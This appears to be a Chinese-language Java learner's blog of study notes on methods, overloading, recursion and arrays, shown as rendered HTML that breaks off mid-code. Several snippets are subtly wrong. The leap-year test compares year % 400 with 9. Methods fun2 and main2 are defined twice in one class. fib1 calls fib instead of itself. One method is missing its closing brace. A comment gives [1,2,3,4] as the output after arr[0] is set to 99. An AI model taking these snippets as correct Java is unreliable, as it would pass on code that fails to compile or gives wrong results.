class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 16:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fangfa1</span> &#123;</span><br><span class="line">    <span class="comment">//闰年</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isiLeapYear</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((year % <span class="number">4</span> == <span class="number">0</span>) &amp;&amp; (year % <span class="number">100</span> != <span class="number">0</span>) || (year % <span class="number">400</span> == <span class="number">9</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法定义</span></span><br><span class="line">    <span class="comment">//修饰符 返回值类型 方法名称([参数类型 形参])&#123;</span></span><br><span class="line">    <span class="comment">// 方法代码块</span></span><br><span class="line">    <span class="comment">//[return 返回值];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> <span class="number">2021</span>;</span><br><span class="line">        <span class="comment">//System.out.println(isiLeapYear(year));</span></span><br><span class="line">        <span class="comment">//int ret = add(x, y);//实际参数 ret：接收方法得返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="方法的重载与重写的区别"><a href="#方法的重载与重写的区别" class="headerlink" title="方法的重载与重写的区别"></a>方法的重载与重写的区别</h1><p>方法重写是存在子父类之间的,子类定义的方法与父类中的方法具有相同的方法名字,相同的参数表和相同的返回类型 </p><p>方法重载是指同一个类中的多个方法具有相同的名字,但这些方法具有不同的参数列表,即参数的数量或参数类型不能完全相同</p><ol><li>方法的名称必须一样</li><li>方法的参数不一样 [数据类型， 个数， 顺序]</li><li>返回值没有要求</li><li>签名使得同名的方法可以区别</li></ol><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 20:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">digui</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 汉诺塔</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos1 起始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos2 中转位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos3 目标位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> n</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hanio</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> pos1, <span class="type">char</span> pos2, <span class="type">char</span> pos3)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            move(pos1, pos3);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hanio(n - <span class="number">1</span>, pos1, pos3, pos2);</span><br><span class="line">        move(pos1, pos3);</span><br><span class="line">        hanio(n - <span class="number">1</span>, pos2, pos1, pos3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos1 起始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos2 目标位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">char</span> pos1, <span class="type">char</span> pos2)</span> &#123;</span><br><span class="line">        System.out.print(pos1 + <span class="string">&quot; -&gt; &quot;</span> + pos2 + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求1 +...+n;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + fun2(n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        hanio(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        hanio(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        hanio(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求1 +...+n;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + fun2(n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求数字的各位数之和</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span> + sum(n / <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//按顺序打印数字的每一位,</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            print(num / <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(num % <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//阶乘</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fac</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n * fac(n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(fac(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        function(a - <span class="number">1</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        function(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求俩个整数的最大值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求三个数的最大值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> c</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> max2(a, b);</span><br><span class="line">        <span class="keyword">return</span> max &gt; c ? max : c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重载写法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> max2(a, b);</span><br><span class="line">        <span class="keyword">return</span> ret &gt; c ? ret : c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fib</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f3</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            f3 = f1 + f2;</span><br><span class="line">            f1 = f2;</span><br><span class="line">            f2 = f3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fib1</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> fib1(n - <span class="number">1</span>)  +  fib( n - <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(fib1(<span class="number">1</span>));</span><br><span class="line">        System.out.println(fib1(<span class="number">2</span>));</span><br><span class="line">        System.out.println(fib1(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是有一种引用数据类型</p><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arr</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            System.out.print(arr1[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">// 数组当中数据类型定义的变量  : 数组名 ，但拿不到数组下标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x: arr1) &#123;</span><br><span class="line">            System.out.print(x + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//专门用来操作数组 Array 需要导入一个包</span></span><br><span class="line">        <span class="comment">//把数组转变为字符串，然后返回</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> Arrays.toString(arr1);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">double</span> arr1[] = <span class="keyword">new</span> <span class="title class_">double</span>[<span class="number">1</span>];<span class="comment">//0.0</span></span><br><span class="line">        <span class="type">float</span> arr2[] = <span class="keyword">new</span> <span class="title class_">float</span>[<span class="number">1</span>];<span class="comment">//0.0f</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(arr2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a3</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;a1, a2, a3&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;<span class="comment">//直接赋值</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;<span class="comment">//动态初始化</span></span><br><span class="line">        <span class="comment">//没有本质区别，只有写法上的区别.</span></span><br><span class="line">        <span class="type">int</span>[] arr4 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//分配空间，默认值0或0.0,boolean是false</span></span><br><span class="line">        System.out.println(arr4[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr3.length;</span><br><span class="line">        System.out.println(arr[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(len);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="数组（引用类型和应用场景）"><a href="#数组（引用类型和应用场景）" class="headerlink" title="数组（引用类型和应用场景）"></a>数组（引用类型和应用场景）</h2><p><img src="https://s2.loli.net/2023/06/04/KaNcYtfUGvEML1r.png" alt="image.png"></p><ul><li><p><em>程序计数器</em>（PC Register）：只是一个很小的空间，保存下一条执行的指令的地址</p></li><li><p><em>虚拟机栈</em>（JVM Stack）：与方法调用相关的一些信息，每个方法在执行时，都会先创建一个栈帧，栈帧中包含有：局部变量表、操作数栈、动态链接、返回地址以及其他的一些信息，保存的都是与方法执行时相关的一些信息。比如：局部变量。当方法运行结束后，栈帧就被销毁了，即栈帧中保存的数据也被销毁了。</p></li><li><p><em>本地方法栈</em>（Native Method Stack）：本地方法栈与虚拟机栈的作用类似.只不过保存的内容是Native方法的局部变量.在有些版本的JVM实现中（例如HotSpot），本地方法栈和虚拟机栈是一起的</p></li><li><p><em>堆</em>（Heap）：JVM所管理的最大内存区域．使用new 创建的对象都是在堆上保存（例如前面的 new int［］（1，2，31），堆是随着程序开始运行时而创建，随着程序的退出而销毁，堆中的数据只要还有在使用，就不会被销毁。</p></li><li><p><em>方法区</em>（Method Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据.方法编译出的的字节码就是保存在这个区域</p></li></ul><p>现在我们只简单关心堆和虚拟机栈这两块空间，后序JVM中还会更详细介绍。</p><p><img src="https://s2.loli.net/2023/06/04/XHIdJgRlSf8wWvZ.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arr</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main7</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="literal">null</span>;<span class="comment">//引用对象的0值，代表这个引用不指向任何对象</span></span><br><span class="line">        <span class="comment">//System.out.println(arr[0]);没对象，哪来的长度,空指针异常</span></span><br><span class="line">        <span class="comment">//所以不能进行读写操作，否则抛出NullPointException</span></span><br><span class="line">        System.out.println(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main6</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//一个引用不能指向多个对象，但一个对象可以被多个引用指向</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        arr = arr2; <span class="comment">//arr没了，此时没人引用&#123;1，2，3，4&#125;就自动回收了</span></span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[3, 4, 5, 7]</span></span><br><span class="line">        System.out.println(Arrays.toString(arr2));<span class="comment">//[3, 4, 5, 7]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] arr2 = arr;<span class="comment">//arr2这个引用指向了arr引用所引用的对象</span></span><br><span class="line">        arr2[<span class="number">1</span>] = <span class="number">99</span>;<span class="comment">//改arr2 arr也会变</span></span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1, 99, 3, 4]</span></span><br><span class="line">        System.out.println(Arrays.toString(arr2));<span class="comment">//[1, 99, 3, 4]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr[i] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的应用场景"><a href="#数组的应用场景" class="headerlink" title="数组的应用场景"></a>数组的应用场景</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="comment">//System.out.println(Arrays.toString(arr));[0...0]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        func1(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1,2,3,4]</span></span><br><span class="line">        func2(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1,2,3,4]</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/06/04/fK4B8Q6mEdYbo5N.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// int[] arr = &#123; 1, 2,3 ,4&#125;;//整体初始化只有一次机会！就是在定义的同时初始化；</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] array)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        array[<span class="number">0</span>] = array[<span class="number">1</span>];</span><br><span class="line">        array[<span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] tmp = &#123; <span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;交换前： &quot;</span> + tmp[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + tmp[<span class="number">1</span>]);</span><br><span class="line">        swap(tmp);</span><br><span class="line">        System.out.println(<span class="string">&quot;交换后： &quot;</span>+ tmp[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + tmp[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] func3() &#123;<span class="comment">//返回一整个数组</span></span><br><span class="line">        <span class="type">int</span>[] tmp = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ret = func3();</span><br><span class="line">        System.out.println(Arrays.toString(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>数组对象是在堆上的</li><li>引用变量目前是在main函数里面的，属于局部变量，当函数结束或就会被收回内存</li><li>是变量被回收后，对象没人引用了，自动回收了，fun函数里的地址和main函数里的地址不同，fun里的回收后，对象还在，但fun里有队arr的操作会保存下来，因为对象被改变了。</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="数组转字符串"><a href="#数组转字符串" class="headerlink" title="数组转字符串"></a>数组转字符串</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">myToString</span><span class="params">(<span class="type">int</span>[] tmp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;[&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tmp.length; i++) &#123;</span><br><span class="line">                ret = ret + tmp[i];</span><br><span class="line">                <span class="keyword">if</span> (i != tmp.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    ret += <span class="string">&quot;,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = ret + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> myToString(array);</span><br><span class="line">        String ret2= myToString(arr2);</span><br><span class="line">        System.out.println(ret1);</span><br><span class="line">        System.out.println(ret2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>法二</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toString</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">iMax</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (iMax == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        b.append(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>  ; ; i++) &#123;</span><br><span class="line">            b.append(arr[i]);</span><br><span class="line">            <span class="keyword">if</span> (i == iMax)</span><br><span class="line">                <span 